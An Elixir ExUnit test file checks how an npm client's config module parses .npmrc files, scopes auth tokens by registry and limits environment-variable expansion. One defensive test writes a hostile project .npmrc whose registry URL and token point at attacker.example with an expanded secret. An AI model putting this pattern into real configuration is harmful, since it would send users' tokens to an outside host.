defmodule NPM.ConfigTest do
  use ExUnit.Case, async: false

  setup do
    old_cwd = File.cwd!()
    old_home = System.get_env("HOME")
    old_npm_token = System.get_env("NPM_TOKEN")
    old_prefetch_timeout = System.get_env("NPM_EX_PREFETCH_TIMEOUT_MS")
    old_app_token = Application.get_env(:duskmoon_npm, :token)
    old_app_prefetch_timeout = Application.get_env(:duskmoon_npm, :prefetch_timeout)
    old_project_expansion = System.get_env("NPM_EX_EXPAND_PROJECT_NPMRC_ENV")
    old_app_project_expansion = Application.get_env(:duskmoon_npm, :expand_project_npmrc_env)

    tmp_dir =
      Path.join(System.tmp_dir!(), "npm_config_test_#{System.unique_integer([:positive])}")

    home_dir = Path.join(tmp_dir, "home")
    project_dir = Path.join(tmp_dir, "project")

    File.rm_rf!(tmp_dir)
    File.mkdir_p!(home_dir)
    File.mkdir_p!(project_dir)

    System.put_env("HOME", home_dir)
    System.delete_env("NPM_TOKEN")
    System.delete_env("NPM_EX_PREFETCH_TIMEOUT_MS")
    Application.delete_env(:duskmoon_npm, :token)
    Application.delete_env(:duskmoon_npm, :prefetch_timeout)
    System.delete_env("NPM_EX_EXPAND_PROJECT_NPMRC_ENV")
    Application.delete_env(:duskmoon_npm, :expand_project_npmrc_env)
    File.cd!(project_dir)

    on_exit(fn ->
      File.cd!(old_cwd)
      restore_env("HOME", old_home)
      restore_env("NPM_TOKEN", old_npm_token)
      restore_env("NPM_EX_PREFETCH_TIMEOUT_MS", old_prefetch_timeout)
      restore_app_env(:token, old_app_token)
      restore_app_env(:prefetch_timeout, old_app_prefetch_timeout)
      restore_env("NPM_EX_EXPAND_PROJECT_NPMRC_ENV", old_project_expansion)
      restore_app_env(:expand_project_npmrc_env, old_app_project_expansion)
      File.rm_rf!(tmp_dir)
    end)

    {:ok, project_dir: project_dir}
  end

  describe ".npmrc syntax" do
    test "ignores ; comments and strips surrounding quotes" do
      config =
        NPM.Config.parse_npmrc("""
        ; a comment
          ; indented=comment
        # hash=comment
        registry = "https://quoted.example/"
        //quoted.example/:_authToken='single-quoted'
        plain=va"lue
        lone="
        """)

      assert config == %{
               "registry" => "https://quoted.example/",
               "//quoted.example/:_authToken" => "single-quoted",
               "plain" => "va\"lue",
               "lone" => "\""
             }
    end

    test "quoted registry values are used without the quotes", %{project_dir: project_dir} do
      File.write!(Path.join(project_dir, ".npmrc"), """
      ; comment=1
      registry="https://quoted.example/npm/"
      //quoted.example/npm/:_authToken="quoted-token"
      """)

      old_registry = System.get_env("NPM_REGISTRY")
      old_app_registry = Application.get_env(:duskmoon_npm, :registry)
      System.delete_env("NPM_REGISTRY")
      Application.delete_env(:duskmoon_npm, :registry)

      on_exit(fn ->
        restore_env("NPM_REGISTRY", old_registry)
        restore_app_env(:registry, old_app_registry)
      end)

      assert NPM.Config.registry() == "https://quoted.example/npm"
      assert NPM.Config.auth_token("https://quoted.example/npm") == "quoted-token"
      refute NPM.Config.read_npmrc_value("; comment")
    end

    test "expands ${VAR} when env expansion is enabled" do
      put_test_env("NPM_CONFIG_TEST_TOKEN", "expanded-secret")
      System.delete_env("NPM_CONFIG_TEST_UNSET")

      content = """
      //npm.pkg.example/:_authToken=${NPM_CONFIG_TEST_TOKEN}
      //unset.example/:_authToken=${NPM_CONFIG_TEST_UNSET}
      mixed="pre-${NPM_CONFIG_TEST_TOKEN}-post"
      """

      # Like npm, an undefined variable is left as written.
      assert NPM.Config.parse_npmrc(content, expand_env: true) == %{
               "//npm.pkg.example/:_authToken" => "expanded-secret",
               "//unset.example/:_authToken" => "${NPM_CONFIG_TEST_UNSET}",
               "mixed" => "pre-expanded-secret-post"
             }

      assert NPM.Config.parse_npmrc(content)["//npm.pkg.example/:_authToken"] ==
               "${NPM_CONFIG_TEST_TOKEN}"
    end

    test "does not expand ${VAR} from a project .npmrc, which a checkout controls", %{
      project_dir: project_dir
    } do
      put_test_env("NPM_CONFIG_TEST_TOKEN", "expanded-secret")

      File.write!(Path.join(project_dir, ".npmrc"), """
      registry=https://attacker.example/${NPM_CONFIG_TEST_TOKEN}/
      //attacker.example/:_authToken=${NPM_CONFIG_TEST_TOKEN}
      """)

      refute NPM.Config.read_npmrc_value("registry") =~ "expanded-secret"
      refute NPM.Config.auth_token("https://attacker.example") == "expanded-secret"
      refute inspect(NPM.Config.load()) =~ "expanded-secret"
    end

    test "a project .npmrc cannot enable its own environment expansion", %{
      project_dir: project_dir
    } do
      put_test_env("NPM_CONFIG_TEST_TOKEN", "expanded-secret")

      File.write!(Path.join(project_dir, ".npmrc"), """
      expand_project_npmrc_env=true
      NPM_EX_EXPAND_PROJECT_NPMRC_ENV=true
      //untrusted.example/:_authToken=${NPM_CONFIG_TEST_TOKEN}
      """)

      refute NPM.Config.expand_project_npmrc_env?()
      assert NPM.Config.auth_token("https://untrusted.example") == "${NPM_CONFIG_TEST_TOKEN}"
      assert NPM.Config.load()["//untrusted.example/:_authToken"] == "${NPM_CONFIG_TEST_TOKEN}"
    end

    test "trusted environment opt-in expands project tokens through every reader", %{
      project_dir: project_dir
    } do
      put_test_env("NPM_CONFIG_TEST_TOKEN", "expanded-secret")
      System.put_env("NPM_EX_EXPAND_PROJECT_NPMRC_ENV", "true")

      File.write!(Path.join(project_dir, ".npmrc"), """
      //trusted.example/:_authToken=${NPM_CONFIG_TEST_TOKEN}
      """)

      assert NPM.Config.expand_project_npmrc_env?()
      assert NPM.Config.read_npmrc_value("//trusted.example/:_authToken") == "expanded-secret"
      assert NPM.Config.auth_token("https://trusted.example") == "expanded-secret"
      assert NPM.Config.load(project_dir)["//trusted.example/:_authToken"] == "expanded-secret"
    end

    test "trusted application opt-in is overridden by an explicit false environment setting", %{
      project_dir: project_dir
    } do
      put_test_env("NPM_CONFIG_TEST_TOKEN", "expanded-secret")
      Application.put_env(:duskmoon_npm, :expand_project_npmrc_env, true)

      File.write!(
        Path.join(project_dir, ".npmrc"),
        "//trusted.example/:_authToken=${NPM_CONFIG_TEST_TOKEN}"
      )

      assert NPM.Config.auth_token("https://trusted.example") == "expanded-secret"
      System.put_env("NPM_EX_EXPAND_PROJECT_NPMRC_ENV", "false")
      refute NPM.Config.expand_project_npmrc_env?()
      assert NPM.Config.auth_token("https://trusted.example") == "${NPM_CONFIG_TEST_TOKEN}"
    end
  end

  defp put_test_env(name, value) do
    old = System.get_env(name)
    System.put_env(name, value)
    on_exit(fn -> restore_env(name, old) end)
  end

  test "does not reuse an npmjs auth token for a custom registry", %{project_dir: project_dir} do
    File.write!(Path.join(project_dir, ".npmrc"), """
    //registry.npmjs.org/:_authToken=npm-token
    registry=https://nexus.gsmlg.net/repository/npm/
    """)

    assert NPM.Config.auth_token("https://registry.npmjs.org") == "npm-token"
    refute NPM.Config.auth_token("https://nexus.gsmlg.net/repository/npm")
  end

  test "uses a token scoped to the custom registry path", %{project_dir: project_dir} do
    File.write!(Path.join(project_dir, ".npmrc"), """
    //nexus.gsmlg.net/repository/npm/:_authToken=nexus-token
    registry=https://nexus.gsmlg.net/repository/npm/
    """)

    assert NPM.Config.auth_token("https://nexus.gsmlg.net/repository/npm") == "nexus-token"
  end

  test "reads resolver prefetch timeout from app config" do
    Application.put_env(:duskmoon_npm, :prefetch_timeout, 120_000)

    assert NPM.Config.prefetch_timeout() == 120_000
  end

  test "prefers resolver prefetch timeout from environment" do
    Application.put_env(:duskmoon_npm, :prefetch_timeout, 120_000)
    System.put_env("NPM_EX_PREFETCH_TIMEOUT_MS", "180000")

    assert NPM.Config.prefetch_timeout() == 180_000
  end

  defp restore_env(name, nil), do: System.delete_env(name)
  defp restore_env(name, value), do: System.put_env(name, value)

  defp restore_app_env(key, nil), do: Application.delete_env(:duskmoon_npm, key)
  defp restore_app_env(key, value), do: Application.put_env(:duskmoon_npm, key, value)
end
